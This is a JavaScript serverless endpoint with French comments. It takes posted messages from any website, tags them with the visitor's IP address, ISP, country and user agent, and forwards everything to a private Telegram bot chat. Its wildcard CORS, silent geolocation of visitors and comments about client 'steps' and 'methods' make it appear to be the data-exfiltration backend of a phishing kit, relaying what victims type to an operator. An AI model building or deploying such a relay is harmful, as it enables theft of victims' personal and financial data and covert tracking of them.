// api/notify.js

const TOKEN        = process.env.TELEGRAM_TOKEN;
const CHAT         = process.env.CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: {
    bodyParser: false,  // on lit nous-mêmes le corps (JSON ou texte)
  },
};

// fonction de lecture du body en JSON ou en texte brut
async function readBody(req) {
  const contentType = req.headers['content-type'] || '';
  const chunks = [];
  for await (const chunk of req) {
    chunks.push(chunk);
  }
  const raw = Buffer.concat(chunks).toString();
  if (contentType.includes('application/json')) {
    try {
      const { message } = JSON.parse(raw);
      return message || '';
    } catch {}
  }
  return raw;
}

async function geoLookup(ip) {
  let isp = 'inconnue', country = 'inconnue', countryCode = '';
  try {
    const r = await fetch(
      `https://ipinfo.io/${ip}/json${IPINFO_TOKEN ? `?token=${IPINFO_TOKEN}` : ''}`
    );
    if (r.ok) {
      const d = await r.json();
      if (d.org) isp = d.org.replace(/^AS\d+\s+/i, '');
      if (d.country) countryCode = d.country;
      if (isp !== 'inconnue' || countryCode) {
        country = countryCode;
        return { isp, countryCode, country };
      }
    }
  } catch {}
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const d = await r.json();
    if (d.success) {
      isp = d.org || isp;
      country = d.country || country;
      return { isp, countryCode: d.country_code, country };
    }
  } catch {}
  try {
    const r = await fetch(
      `https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`
    );
    const d = await r.json();
    if (d.status === 'success') {
      isp = d.isp.replace(/^AS\d+\s+/i, '') || isp;
      country = d.country || country;
      countryCode = d.countryCode;
      return { isp, countryCode, country };
    }
  } catch {}
  return { isp, countryCode, country };
}

function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length === 2) {
    try {
      const dn = new Intl.DisplayNames(['fr'], { type: 'region' });
      return dn.of(codeOrName);
    } catch {}
  }
  return codeOrName;
}

export default async function handler(req, res) {
  // CORS pour Safari (pré-flight)
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST, OPTIONS');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // 1️⃣ On lit d'abord ton message (Étape, Méthode, Choix du client…)
  const message = (await readBody(req)).trim();
  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }

  // 2️⃣ IP + UA
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // 3️⃣ Geo
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country || countryCode);

  // 4️⃣ Date & heure
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR', {
    day: '2-digit', month: '2-digit', year: 'numeric'
  });
  const time = now.toLocaleTimeString('fr-FR', {
    hour: '2-digit', minute: '2-digit', second: '2-digit'
  });

  // 5️⃣ Construction du texte brut à envoyer
  let text = `${message}\n\n`;        // ton message en premier
  text += `IP : ${ip}\n`;
  text += `- ISP Client   : ${isp}\n`;
  text += `- Pays Client  : ${countryDisplay}\n`;
  text += `- User-Agent   : ${ua}\n`;
  text += `- Date & heure : ${date} ${time}\n`;
  text += `©️ ${now.getFullYear()}`;

  // 6️⃣ Envoi sur Telegram en plain text
  const payload = {
    chat_id: CHAT,
    text,
    disable_web_page_preview: true
  };
  const tg = await fetch(
    `https://api.telegram.org/bot${TOKEN}/sendMessage`,
    {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }
  );
  const raw = await tg.text();
  return res.status(tg.ok ? 200 : tg.status).json({ ok: tg.ok, full: raw });
}